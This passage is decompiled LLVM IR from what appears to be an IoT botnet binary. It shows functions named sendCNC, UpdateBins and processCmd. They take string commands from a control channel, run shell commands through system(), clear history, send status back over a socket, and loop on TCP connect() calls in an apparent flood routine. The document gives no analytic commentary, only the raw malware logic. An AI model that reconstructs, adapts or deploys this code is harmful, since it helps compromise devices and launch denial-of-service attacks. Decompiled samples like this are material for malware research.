  br i1 %v4_804d64c, label %dec_label_pc_804d697.backedge, label %dec_label_pc_804d652

dec_label_pc_804d652:                             ; preds = %dec_label_pc_804d62e
  store i1 false, i1* @df, align 1
  store i32 %v2_804d604, i32* @edi, align 4
  %v3_804d66c = call i32 @_strlen(i8* %v4_804d666)
  %v5_804d681 = call i32 @__libc_write(i32 %v4_804d641, i32* nonnull %stack_var_-3144, i32 %v3_804d66c)
  %v1_804d68f = call i32 @__libc_close(i32 %v4_804d641)
  br label %dec_label_pc_804d697.backedge

dec_label_pc_804d697.backedge:                    ; preds = %dec_label_pc_804d652, %dec_label_pc_804d62e
  %v2_804d69c = call i32 @__GI_time(i32* null)
  %v5_804d6a7 = icmp slt i32 %v2_804d69c, %v5_804d5b2
  br i1 %v5_804d6a7, label %dec_label_pc_804d62e, label %dec_label_pc_804d6a9

dec_label_pc_804d6a9:                             ; preds = %dec_label_pc_804d697.backedge, %dec_label_pc_804d697.preheader
  %v1_804d6ae = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804d6b3:                             ; preds = %dec_label_pc_804d61f
  %v4_804d6b3 = add nuw nsw i32 %storemerge46, 1
  %v5_804d6bc = icmp slt i32 %v4_804d6b3, %arg6
  br i1 %v5_804d6bc, label %dec_label_pc_804d61f, label %dec_label_pc_804d6c2

dec_label_pc_804d6c2:                             ; preds = %dec_label_pc_804d6b3, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804d6b3, %dec_label_pc_804d6b3 ]
  store i32 %v0_804d558, i32* @ebx, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804d6b3, { 0, 2, 1 }
  uselistorder i32 %storemerge46, { 1, 0 }
  uselistorder i32 %v5_804d5b2, { 1, 0, 2 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_804d62e, { 1, 0 }
  uselistorder label %dec_label_pc_804d61f, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_804d6d4 = call i32 @__GI_time(i32* null)
  %v5_804d6dc = add i32 %v2_804d6d4, %arg3
  %v1_804d6e9 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804d6fd = urem i32 %arg2, 65536
  %v1_804d706 = call i32 @htons(i32 %v1_804d6fd)
  %v2_804d728 = ptrtoint i32* %stack_var_-28 to i32
  %v2_804d75c19 = call i32 @__GI_time(i32* null)
  %v5_804d76722 = icmp slt i32 %v2_804d75c19, %v5_804d6dc
  br i1 %v5_804d76722, label %dec_label_pc_804d714, label %dec_label_pc_804d769

dec_label_pc_804d714:                             ; preds = %entry, %dec_label_pc_804d714
  %v3_804d71d = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_804d734 = call i32 @__libc_connect(i32 %v3_804d71d, i32 %v2_804d728, i32 16)
  %v1_804d741 = call i32 @sleep(i32 1)
  %v1_804d74f = call i32 @__libc_close(i32 %v3_804d71d)
  %v2_804d75c = call i32 @__GI_time(i32* null)
  %v5_804d767 = icmp slt i32 %v2_804d75c, %v5_804d6dc
  br i1 %v5_804d767, label %dec_label_pc_804d714, label %dec_label_pc_804d769

dec_label_pc_804d769:                             ; preds = %dec_label_pc_804d714, %entry
  %v2_804d75c.lcssa = phi i32 [ %v2_804d75c19, %entry ], [ %v2_804d75c, %dec_label_pc_804d714 ]
  ret i32 %v2_804d75c.lcssa

; uselistorder directives
  uselistorder i32 %v5_804d6dc, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder label %dec_label_pc_804d714, { 1, 0 }
}

define i32 @UpdateBins(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d76b = load i32, i32* @ebp, align 4
  store i32 %v0_804d76b, i32* %stack_var_-4, align 4
  %v1_804d771 = call i32 @__libc_fork(i32 %v0_804d76b)
  %v4_804d779 = icmp eq i32 %v1_804d771, 0
  %v1_804d77d = icmp eq i1 %v4_804d779, false
  br i1 %v1_804d77d, label %dec_label_pc_804d79e, label %dec_label_pc_804d77f

dec_label_pc_804d77f:                             ; preds = %entry
  %v2_804d787 = call i32 @__libc_system(i32 ptrtoint ([410 x i8]* @global_var_805f01c.627 to i32))
  %v2_804d794 = call i32 @sleep(i32 20)
  br label %dec_label_pc_804d7b1

dec_label_pc_804d79e:                             ; preds = %entry
  %v4_804d7a9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805f1b6.628, i32 0, i32 0), i32 %v1_804d771)
  br label %dec_label_pc_804d7b1

dec_label_pc_804d7b1:                             ; preds = %dec_label_pc_804d77f, %dec_label_pc_804d79e
  %storemerge = phi i32 [ %v2_804d794, %dec_label_pc_804d77f ], [ %v4_804d7a9, %dec_label_pc_804d79e ]
  %v2_804d7b1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d7b1, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_804d7b1, { 1, 0 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp170 = call i32 @__decompiler_undefined_function_0()
  %tmp226 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-476 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d7b6 = load i32, i32* @edi, align 4
  %v0_804d7b7 = load i32, i32* @esi, align 4
  %v0_804d7b8 = load i32, i32* @ebx, align 4
  store i32 %v0_804d7b8, i32* %stack_var_-16, align 4
  %v5_804d7b9 = icmp ult i32* %stack_var_-16, inttoptr (i32 444 to i32*)
  store i1 %v5_804d7b9, i1* %cf.global-to-local, align 1
  %v15_804d7b9 = ptrtoint i32* %stack_var_-460 to i32
  %v1_804d7c2 = inttoptr i32 %tmp226 to i32*
  %v2_804d7c2 = load i32, i32* %v1_804d7c2, align 4
  %v4_804d7df = inttoptr i32 %v2_804d7c2 to i8*
  %v7_804d7f1 = call i32 @_strncmp(i8* %v4_804d7df, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805f1ba.629, i32 0, i32 0), i32 7)
  %v8_804d7f1 = urem i32 %v7_804d7f1, 2
  %v9_804d7f1 = icmp eq i32 %v8_804d7f1, 0
  %v0_804d7f3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d7f3 = or i1 %v0_804d7f3, %v9_804d7f1
  %v3_804d7f3 = zext i1 %v2_804d7f3 to i32
  %v4_804d7f3 = load i32, i32* @edx, align 4
  %v5_804d7f3 = and i32 %v4_804d7f3, -256
  %v6_804d7f3 = or i32 %v3_804d7f3, %v5_804d7f3
  %v7_804d7f3 = xor i32 %v6_804d7f3, 1
  store i32 %v7_804d7f3, i32* @edx, align 4
  %v1_804d7fb = trunc i32 %v7_804d7f3 to i8
  %v3_804d7fb = zext i1 %v0_804d7f3 to i8
  %v15_804d7fb = icmp eq i8 %v1_804d7fb, %v3_804d7fb
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d804 = icmp eq i1 %v15_804d7fb, false
  br i1 %v1_804d804, label %dec_label_pc_804d9de, label %dec_label_pc_804d80a

dec_label_pc_804d80a:                             ; preds = %entry
  %v1_804d80d = add i32 %tmp226, 4
  %v5_804d80d = icmp ugt i32 %tmp226, -5
  store i1 %v5_804d80d, i1* %cf.global-to-local, align 1
  %v1_804d810 = inttoptr i32 %v1_804d80d to i32*
  %v2_804d810 = load i32, i32* %v1_804d810, align 4
  store i1 false, i1* @df, align 1
  %v4_804d82d = inttoptr i32 %v2_804d810 to i8*
  store i32 %v2_804d810, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805f1c1.630 to i32), i32* @edi, align 4
  %v7_804d83f = call i32 @_strncmp(i8* %v4_804d82d, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805f1c1.630, i32 0, i32 0), i32 8)
  %v8_804d83f = urem i32 %v7_804d83f, 2
  %v9_804d83f = icmp eq i32 %v8_804d83f, 0
  %v0_804d841 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d841 = or i1 %v0_804d841, %v9_804d83f
  %v3_804d841 = zext i1 %v2_804d841 to i32
  %v4_804d841 = load i32, i32* @edx, align 4
  %v5_804d841 = and i32 %v4_804d841, -256
  %v6_804d841 = or i32 %v3_804d841, %v5_804d841
  %v7_804d841 = xor i32 %v6_804d841, 1
  store i32 %v7_804d841, i32* @edx, align 4
  %v1_804d849 = trunc i32 %v7_804d841 to i8
  %v3_804d849 = zext i1 %v0_804d841 to i8
  %v15_804d849 = icmp eq i8 %v1_804d849, %v3_804d849
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d852 = icmp eq i1 %v15_804d849, false
  br i1 %v1_804d852, label %dec_label_pc_804d87f, label %dec_label_pc_804d854

dec_label_pc_804d854:                             ; preds = %dec_label_pc_804d80a
  %v0_804d854 = load i32, i32* @esp, align 4
  %v5_804d854 = icmp ult i32 %v0_804d854, 12
  store i1 %v5_804d854, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([141 x i8]* @global_var_805f1cc.631 to i32), i32* %stack_var_-476, align 4
  %v1_804d85c = call i32 @__libc_system(i32 ptrtoint ([141 x i8]* @global_var_805f1cc.631 to i32))
  %v0_804d861 = load i32, i32* @esp, align 4
  %v2_804d861 = icmp ugt i32 %v0_804d861, -17
  store i1 %v2_804d861, i1* %cf.global-to-local, align 1
  %v0_804d864 = call i32 @ClearHistory()
  %v0_804d869 = load i32, i32* @global_var_8061580.20, align 128
  %v0_804d86e = load i32, i32* @esp, align 4
  %v5_804d86e = icmp ult i32 %v0_804d86e, 8
  store i1 %v5_804d86e, i1* %cf.global-to-local, align 1
  store i32 %v0_804d869, i32* %stack_var_-476, align 4
  %v2_804d877 = call i32 @sockprintf(i32 %v0_804d869, i32 ptrtoint ([26 x i8]* @global_var_805f259.632 to i32))
  %v0_804d87c = load i32, i32* @esp, align 4
  %v2_804d87c = icmp ugt i32 %v0_804d87c, -17
  store i1 %v2_804d87c, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d87f

dec_label_pc_804d87f:                             ; preds = %dec_label_pc_804d80a, %dec_label_pc_804d854
  store i1 %v5_804d80d, i1* %cf.global-to-local, align 1
  %v2_804d885 = load i32, i32* %v1_804d810, align 4
  store i1 false, i1* @df, align 1
  %v4_804d8a2 = inttoptr i32 %v2_804d885 to i8*
  store i32 %v2_804d885, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805f273.633 to i32), i32* @edi, align 4
  %v7_804d8b4 = call i32 @_strncmp(i8* %v4_804d8a2, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805f273.633, i32 0, i32 0), i32 7)
  %v8_804d8b4 = urem i32 %v7_804d8b4, 2
  %v9_804d8b4 = icmp eq i32 %v8_804d8b4, 0
  %v0_804d8b6 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d8b6 = or i1 %v0_804d8b6, %v9_804d8b4
  %v3_804d8b6 = zext i1 %v2_804d8b6 to i32
  %v4_804d8b6 = load i32, i32* @edx, align 4
  %v5_804d8b6 = and i32 %v4_804d8b6, -256
  %v6_804d8b6 = or i32 %v3_804d8b6, %v5_804d8b6
  %v7_804d8b6 = xor i32 %v6_804d8b6, 1
  store i32 %v7_804d8b6, i32* @edx, align 4
  %v1_804d8be = trunc i32 %v7_804d8b6 to i8
  %v3_804d8be = zext i1 %v0_804d8b6 to i8
  %v15_804d8be = icmp eq i8 %v1_804d8be, %v3_804d8be
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d8c7 = icmp eq i1 %v15_804d8be, false
  br i1 %v1_804d8c7, label %dec_label_pc_804d8f4, label %dec_label_pc_804d8c9

dec_label_pc_804d8c9:                             ; preds = %dec_label_pc_804d87f
  %v0_804d8c9 = load i32, i32* @esp, align 4
  %v5_804d8c9 = icmp ult i32 %v0_804d8c9, 12
  store i1 %v5_804d8c9, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([58 x i8]* @global_var_805f27c.634 to i32), i32* %stack_var_-476, align 4
  %v1_804d8d1 = call i32 @__libc_system(i32 ptrtoint ([58 x i8]* @global_var_805f27c.634 to i32))
  %v0_804d8d6 = load i32, i32* @esp, align 4
  %v2_804d8d6 = icmp ugt i32 %v0_804d8d6, -17
  store i1 %v2_804d8d6, i1* %cf.global-to-local, align 1
  %v0_804d8d9 = call i32 @ClearHistory()
  %v0_804d8de = load i32, i32* @global_var_8061580.20, align 128
  %v0_804d8e3 = load i32, i32* @esp, align 4
  %v5_804d8e3 = icmp ult i32 %v0_804d8e3, 8
  store i1 %v5_804d8e3, i1* %cf.global-to-local, align 1
  store i32 %v0_804d8de, i32* %stack_var_-476, align 4
  %v2_804d8ec = call i32 @sockprintf(i32 %v0_804d8de, i32 ptrtoint ([24 x i8]* @global_var_805f2b6.635 to i32))
  %v0_804d8f1 = load i32, i32* @esp, align 4
  %v2_804d8f1 = icmp ugt i32 %v0_804d8f1, -17
  store i1 %v2_804d8f1, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d8f4

dec_label_pc_804d8f4:                             ; preds = %dec_label_pc_804d87f, %dec_label_pc_804d8c9
  store i1 %v5_804d80d, i1* %cf.global-to-local, align 1
  %v2_804d8fa = load i32, i32* %v1_804d810, align 4
  store i1 false, i1* @df, align 1
  %v4_804d917 = inttoptr i32 %v2_804d8fa to i8*
  store i32 %v2_804d8fa, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805f2ce.636 to i32), i32* @edi, align 4
  %v7_804d929 = call i32 @_strncmp(i8* %v4_804d917, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805f2ce.636, i32 0, i32 0), i32 4)
  %v8_804d929 = urem i32 %v7_804d929, 2
  %v9_804d929 = icmp eq i32 %v8_804d929, 0
  %v0_804d92b = load i1, i1* %cf.global-to-local, align 1
  %v2_804d92b = or i1 %v0_804d92b, %v9_804d929
  %v3_804d92b = zext i1 %v2_804d92b to i32
  %v4_804d92b = load i32, i32* @edx, align 4
  %v5_804d92b = and i32 %v4_804d92b, -256
  %v6_804d92b = or i32 %v3_804d92b, %v5_804d92b
  %v7_804d92b = xor i32 %v6_804d92b, 1
  store i32 %v7_804d92b, i32* @edx, align 4
  %v1_804d933 = trunc i32 %v7_804d92b to i8
  %v3_804d933 = zext i1 %v0_804d92b to i8
  %v15_804d933 = icmp eq i8 %v1_804d933, %v3_804d933
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d93c = icmp eq i1 %v15_804d933, false
  br i1 %v1_804d93c, label %dec_label_pc_804d969, label %dec_label_pc_804d93e

dec_label_pc_804d93e:                             ; preds = %dec_label_pc_804d8f4
  %v0_804d93e = load i32, i32* @esp, align 4
  %v5_804d93e = icmp ult i32 %v0_804d93e, 12
  store i1 %v5_804d93e, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([31 x i8]* @global_var_805f2d4.637 to i32), i32* %stack_var_-476, align 4
  %v1_804d946 = call i32 @__libc_system(i32 ptrtoint ([31 x i8]* @global_var_805f2d4.637 to i32))
  %v0_804d94b = load i32, i32* @esp, align 4
  %v2_804d94b = icmp ugt i32 %v0_804d94b, -17
  store i1 %v2_804d94b, i1* %cf.global-to-local, align 1
  %v0_804d94e = call i32 @ClearHistory()
  %v0_804d953 = load i32, i32* @global_var_8061580.20, align 128
  %v0_804d958 = load i32, i32* @esp, align 4
  %v5_804d958 = icmp ult i32 %v0_804d958, 8
  store i1 %v5_804d958, i1* %cf.global-to-local, align 1
  store i32 %v0_804d953, i32* %stack_var_-476, align 4
  %v2_804d961 = call i32 @sockprintf(i32 %v0_804d953, i32 ptrtoint ([24 x i8]* @global_var_805f2f3.638 to i32))
  %v0_804d966 = load i32, i32* @esp, align 4
  %v2_804d966 = icmp ugt i32 %v0_804d966, -17
  store i1 %v2_804d966, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d969

dec_label_pc_804d969:                             ; preds = %dec_label_pc_804d8f4, %dec_label_pc_804d93e
  store i1 %v5_804d80d, i1* %cf.global-to-local, align 1
  %v2_804d96f = load i32, i32* %v1_804d810, align 4
  store i1 false, i1* @df, align 1
  %v4_804d98c = inttoptr i32 %v2_804d96f to i8*
  store i32 %v2_804d96f, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805f30b.639 to i32), i32* @edi, align 4
  %v7_804d99e = call i32 @_strncmp(i8* %v4_804d98c, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805f30b.639, i32 0, i32 0), i32 6)
  %v8_804d99e = urem i32 %v7_804d99e, 2
  %v9_804d99e = icmp eq i32 %v8_804d99e, 0
  %v0_804d9a0 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d9a0 = or i1 %v0_804d9a0, %v9_804d99e
  %v3_804d9a0 = zext i1 %v2_804d9a0 to i32
  %v4_804d9a0 = load i32, i32* @edx, align 4
  %v5_804d9a0 = and i32 %v4_804d9a0, -256
  %v6_804d9a0 = or i32 %v3_804d9a0, %v5_804d9a0
  %v7_804d9a0 = xor i32 %v6_804d9a0, 1
  store i32 %v7_804d9a0, i32* @edx, align 4
  %v1_804d9a8 = trunc i32 %v7_804d9a0 to i8
  %v3_804d9a8 = zext i1 %v0_804d9a0 to i8
  %v15_804d9a8 = icmp eq i8 %v1_804d9a8, %v3_804d9a8
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d9b1 = icmp eq i1 %v15_804d9a8, false
  br i1 %v1_804d9b1, label %dec_label_pc_804d9de, label %dec_label_pc_804d9b3

dec_label_pc_804d9b3:                             ; preds = %dec_label_pc_804d969
  %v0_804d9b3 = load i32, i32* @esp, align 4
  %v5_804d9b3 = icmp ult i32 %v0_804d9b3, 12
  store i1 %v5_804d9b3, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([40 x i8]* @global_var_805f314.640 to i32), i32* %stack_var_-476, align 4
  %v1_804d9bb = call i32 @__libc_system(i32 ptrtoint ([40 x i8]* @global_var_805f314.640 to i32))
  %v0_804d9c0 = load i32, i32* @esp, align 4
  %v2_804d9c0 = icmp ugt i32 %v0_804d9c0, -17
  store i1 %v2_804d9c0, i1* %cf.global-to-local, align 1
  %v0_804d9c3 = call i32 @ClearHistory()
  %v0_804d9c8 = load i32, i32* @global_var_8061580.20, align 128
  %v0_804d9cd = load i32, i32* @esp, align 4
  %v5_804d9cd = icmp ult i32 %v0_804d9cd, 8
  store i1 %v5_804d9cd, i1* %cf.global-to-local, align 1
  store i32 %v0_804d9c8, i32* %stack_var_-476, align 4
  %v2_804d9d6 = call i32 @sockprintf(i32 %v0_804d9c8, i32 ptrtoint ([28 x i8]* @global_var_805f33c.641 to i32))
  %v0_804d9db = load i32, i32* @esp, align 4
  %v2_804d9db = icmp ugt i32 %v0_804d9db, -17
  store i1 %v2_804d9db, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d9de

dec_label_pc_804d9de:                             ; preds = %dec_label_pc_804d969, %entry, %dec_label_pc_804d9b3
  %v2_804d9e1 = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804d9fe = inttoptr i32 %v2_804d9e1 to i8*
  store i32 %v2_804d9e1, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8057157.21 to i32), i32* @edi, align 4
  %v7_804da10 = call i32 @_strncmp(i8* %v4_804d9fe, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057157.21, i32 0, i32 0), i32 5)
  %v8_804da10 = urem i32 %v7_804da10, 2
  %v9_804da10 = icmp eq i32 %v8_804da10, 0
  %v0_804da12 = load i1, i1* %cf.global-to-local, align 1
  %v2_804da12 = or i1 %v0_804da12, %v9_804da10
  %v3_804da12 = zext i1 %v2_804da12 to i32
  %v4_804da12 = load i32, i32* @edx, align 4
  %v5_804da12 = and i32 %v4_804da12, -256
  %v6_804da12 = or i32 %v3_804da12, %v5_804da12
  %v7_804da12 = xor i32 %v6_804da12, 1
  store i32 %v7_804da12, i32* %edx.global-to-local, align 4
  %v1_804da1a = trunc i32 %v7_804da12 to i8
  %v3_804da1a = zext i1 %v0_804da12 to i8
  %v15_804da1a = icmp eq i8 %v1_804da1a, %v3_804da1a
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804da23 = icmp eq i1 %v15_804da1a, false
  br i1 %v1_804da23, label %dec_label_pc_804da40, label %dec_label_pc_804da25

dec_label_pc_804da25:                             ; preds = %dec_label_pc_804d9de
  %v0_804da25 = load i32, i32* @global_var_8061580.20, align 128
  %v0_804da2a = load i32, i32* @esp, align 4
  %v5_804da2a = icmp ult i32 %v0_804da2a, 8
  store i1 %v5_804da2a, i1* %cf.global-to-local, align 1
  store i32 %v0_804da25, i32* %stack_var_-476, align 4
  %v2_804da33 = call i32 @sockprintf(i32 %v0_804da25, i32 ptrtoint ([6 x i8]* @global_var_805f358.642 to i32))
  %v0_804da38 = load i32, i32* @esp, align 4
  %v2_804da38 = icmp ugt i32 %v0_804da38, -17
  store i1 %v2_804da38, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb69

dec_label_pc_804da40:                             ; preds = %dec_label_pc_804d9de
  %v2_804da43 = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804da60 = inttoptr i32 %v2_804da43 to i8*
  store i32 %v2_804da43, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805f35e.643 to i32), i32* @edi, align 4
  %v7_804da72 = call i32 @_strncmp(i8* %v4_804da60, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805f35e.643, i32 0, i32 0), i32 6)
  %v8_804da72 = urem i32 %v7_804da72, 2
  %v9_804da72 = icmp eq i32 %v8_804da72, 0
  %v0_804da74 = load i1, i1* %cf.global-to-local, align 1
  %v2_804da74 = or i1 %v0_804da74, %v9_804da72
  %v3_804da74 = zext i1 %v2_804da74 to i32
  %v4_804da74 = load i32, i32* %edx.global-to-local, align 4
  %v5_804da74 = and i32 %v4_804da74, -256
  %v6_804da74 = or i32 %v3_804da74, %v5_804da74
  %v7_804da74 = xor i32 %v6_804da74, 1
  store i32 %v7_804da74, i32* %edx.global-to-local, align 4
  %v1_804da7c = trunc i32 %v7_804da74 to i8
  %v3_804da7c = zext i1 %v0_804da74 to i8
  %v15_804da7c = icmp eq i8 %v1_804da7c, %v3_804da7c
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804da85 = icmp eq i1 %v15_804da7c, false
  br i1 %v1_804da85, label %dec_label_pc_804daa9, label %dec_label_pc_804da87

dec_label_pc_804da87:                             ; preds = %dec_label_pc_804da40
  %v0_804da87 = call i32 @getdtablesize()
  %v0_804da8c = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804da8c, i32* %edx.global-to-local, align 4
  %v0_804da92 = load i32, i32* @esp, align 4
  %v5_804da92 = icmp ult i32 %v0_804da92, 4
  store i1 %v5_804da92, i1* %cf.global-to-local, align 1
  store i32 %v0_804da8c, i32* %stack_var_-476, align 4
  %v2_804da9c = call i32 @sockprintf(i32 %v0_804da8c, i32 ptrtoint ([3 x i8]* @global_var_805f364.644 to i32))
  %v0_804daa1 = load i32, i32* @esp, align 4
  %v2_804daa1 = icmp ugt i32 %v0_804daa1, -17
  store i1 %v2_804daa1, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb69

dec_label_pc_804daa9:                             ; preds = %dec_label_pc_804da40
  %v2_804daac = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804dac9 = inttoptr i32 %v2_804daac to i8*
  store i32 %v2_804daac, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805f273.633 to i32), i32* @edi, align 4
  %v7_804dadb = call i32 @_strncmp(i8* %v4_804dac9, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805f273.633, i32 0, i32 0), i32 7)
  %v8_804dadb = urem i32 %v7_804dadb, 2
  %v9_804dadb = icmp eq i32 %v8_804dadb, 0
  %v0_804dadd = load i1, i1* %cf.global-to-local, align 1
  %v2_804dadd = or i1 %v0_804dadd, %v9_804dadb
  %v3_804dadd = zext i1 %v2_804dadd to i32
  %v4_804dadd = load i32, i32* %edx.global-to-local, align 4
  %v5_804dadd = and i32 %v4_804dadd, -256
  %v6_804dadd = or i32 %v3_804dadd, %v5_804dadd
  %v7_804dadd = xor i32 %v6_804dadd, 1
  store i32 %v7_804dadd, i32* %edx.global-to-local, align 4
  %v1_804dae5 = trunc i32 %v7_804dadd to i8
  %v3_804dae5 = zext i1 %v0_804dadd to i8
  %v15_804dae5 = icmp eq i8 %v1_804dae5, %v3_804dae5
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804daee = icmp eq i1 %v15_804dae5, false
  br i1 %v1_804daee, label %dec_label_pc_804db18, label %dec_label_pc_804daf0

dec_label_pc_804daf0:                             ; preds = %dec_label_pc_804daa9
  %v0_804daf0 = load i32, i32* @global_var_8061580.20, align 128
  %v0_804daf5 = load i32, i32* @esp, align 4
  %v5_804daf5 = icmp ult i32 %v0_804daf5, 8
  store i1 %v5_804daf5, i1* %cf.global-to-local, align 1
  store i32 %v0_804daf0, i32* %stack_var_-476, align 4
  %v2_804dafe = call i32 @sockprintf(i32 %v0_804daf0, i32 ptrtoint ([25 x i8]* @global_var_805f367.645 to i32))
  %v5_804db06 = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804db06, i1* %cf.global-to-local, align 1
  store i32 1, i32* %stack_var_-476, align 4
  %v1_804db0b = call i32 @UpdateBins(i32 1)
  %v0_804db10 = load i32, i32* @esp, align 4
  %v2_804db10 = icmp ugt i32 %v0_804db10, -17
  store i1 %v2_804db10, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb69

dec_label_pc_804db18:                             ; preds = %dec_label_pc_804daa9
  %v2_804db1b = load i32, i32* %v1_804d7c2, align 4
  %v4_804db38 = inttoptr i32 %v2_804db1b to i8*
  %v7_804db4a = call i32 @_strncmp(i8* %v4_804db38, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805f380.646, i32 0, i32 0), i32 8)
  %v8_804db4a = urem i32 %v7_804db4a, 2
  %v9_804db4a = icmp eq i32 %v8_804db4a, 0
  %v0_804db4c = load i1, i1* %cf.global-to-local, align 1
  %v2_804db4c = or i1 %v0_804db4c, %v9_804db4a
  %v3_804db4c = zext i1 %v2_804db4c to i32
  %v4_804db4c = load i32, i32* %edx.global-to-local, align 4
  %v5_804db4c = and i32 %v4_804db4c, -256
  %v6_804db4c = or i32 %v3_804db4c, %v5_804db4c
  %v7_804db4c = xor i32 %v6_804db4c, 1
  store i32 %v7_804db4c, i32* %edx.global-to-local, align 4
  %v1_804db54 = trunc i32 %v7_804db4c to i8
  %v3_804db54 = zext i1 %v0_804db4c to i8
  %v15_804db54 = icmp eq i8 %v1_804db54, %v3_804db54
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804db5d = icmp eq i1 %v15_804db54, false
  br i1 %v1_804db5d, label %dec_label_pc_804dcd7, label %dec_label_pc_804db63

dec_label_pc_804db63:                             ; preds = %dec_label_pc_804db18
  %v1_804db66 = add i32 %tmp226, 4
  %v5_804db66 = icmp ugt i32 %tmp226, -5
  store i1 %v5_804db66, i1* %cf.global-to-local, align 1
  %v1_804db69 = inttoptr i32 %v1_804db66 to i32*
  %v2_804db69 = load i32, i32* %v1_804db69, align 4
  store i1 false, i1* @df, align 1
  %v4_804db86 = inttoptr i32 %v2_804db69 to i8*
  store i32 %v2_804db69, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805f2ce.636 to i32), i32* @edi, align 4
  %v7_804db98 = call i32 @_strncmp(i8* %v4_804db86, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805f2ce.636, i32 0, i32 0), i32 4)
  %v8_804db98 = urem i32 %v7_804db98, 2
  %v9_804db98 = icmp eq i32 %v8_804db98, 0
  %v0_804db9a = load i1, i1* %cf.global-to-local, align 1
  %v2_804db9a = or i1 %v0_804db9a, %v9_804db98
  %v3_804db9a = zext i1 %v2_804db9a to i32
  %v4_804db9a = load i32, i32* %edx.global-to-local, align 4
  %v5_804db9a = and i32 %v4_804db9a, -256
  %v6_804db9a = or i32 %v3_804db9a, %v5_804db9a
  %v7_804db9a = xor i32 %v6_804db9a, 1
  store i32 %v7_804db9a, i32* @edx, align 4
  %v1_804dba2 = trunc i32 %v7_804db9a to i8
  %v3_804dba2 = zext i1 %v0_804db9a to i8
  %v15_804dba2 = icmp eq i8 %v1_804dba2, %v3_804dba2
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dbab = icmp eq i1 %v15_804dba2, false
  br i1 %v1_804dbab, label %dec_label_pc_804dbed, label %dec_label_pc_804dbad

dec_label_pc_804dbad:                             ; preds = %dec_label_pc_804db63
  %v0_804dbad = load i32, i32* @global_var_8067810.647, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dbb2 = icmp eq i32 %v0_804dbad, 0
  br i1 %v1_804dbb2, label %dec_label_pc_804eb69, label %dec_label_pc_804dbba

dec_label_pc_804dbba:                             ; preds = %dec_label_pc_804dbad
  %v0_804dbbf = load i32, i32* @esp, align 4
  %v5_804dbbf = icmp ult i32 %v0_804dbbf, 8
  store i1 %v5_804dbbf, i1* %cf.global-to-local, align 1
  store i32 %v0_804dbad, i32* %stack_var_-476, align 4
